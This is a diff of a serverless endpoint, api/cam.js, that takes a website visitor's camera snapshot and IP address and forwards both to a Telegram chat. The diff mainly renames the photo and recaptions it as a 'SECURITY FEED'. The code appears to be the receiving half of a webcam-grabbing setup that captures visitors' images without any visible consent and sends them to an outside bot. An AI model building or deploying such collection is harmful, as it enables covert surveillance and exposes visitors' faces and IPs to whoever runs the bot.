@@ -1,4 +1,4 @@
-// api/cam.js — receives visitor camera snap and sends to Telegram with clean info
+// api/cam.js — receives visitor camera snap and forwards to Telegram with SOC caption
 const recentSnaps = new Map();
 const COOLDOWN_MS = 15 * 1000; // 15s debounce per IP
 
@@ -15,17 +15,16 @@ export default async function handler(req, res) {
       (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
       req.headers['x-real-ip'] ||
       req.socket?.remoteAddress ||
-      'unknown';
+      '';
 
-    // Rate-limit check per IP
     const now = Date.now();
-    if (ip !== 'unknown' && recentSnaps.has(ip)) {
+    if (ip && recentSnaps.has(ip)) {
       const lastSnap = recentSnaps.get(ip);
       if (now - lastSnap < COOLDOWN_MS) {
         return res.status(200).json({ ok: true, skipped: 'debounced' });
       }
     }
-    if (ip !== 'unknown') recentSnaps.set(ip, now);
+    if (ip) recentSnaps.set(ip, now);
 
     let base64 = req.body && req.body.photo;
     if (!base64) {
@@ -41,8 +40,12 @@ export default async function handler(req, res) {
 
     const tgForm = new FormData();
     tgForm.append("chat_id", CHAT);
-    tgForm.append("photo", new Blob([buffer], { type: "image/jpeg" }), "visitor_snap.jpg");
-    tgForm.append("caption", `📸 <b>Visitor Camera Photo</b>\n🌐 IP: <code>${ip}</code>`);
+    tgForm.append("photo", new Blob([buffer], { type: "image/jpeg" }), "security_snap.jpg");
+    
+    let caption = '📸 <b>SECURITY FEED // VISITOR SNAPSHOT</b>';
+    if (ip) caption += `\n🌐 <b>IP Address:</b> <code>${ip}</code>`;
+    
+    tgForm.append("caption", caption);
     tgForm.append("parse_mode", "HTML");
 
     const tgRes = await fetch(
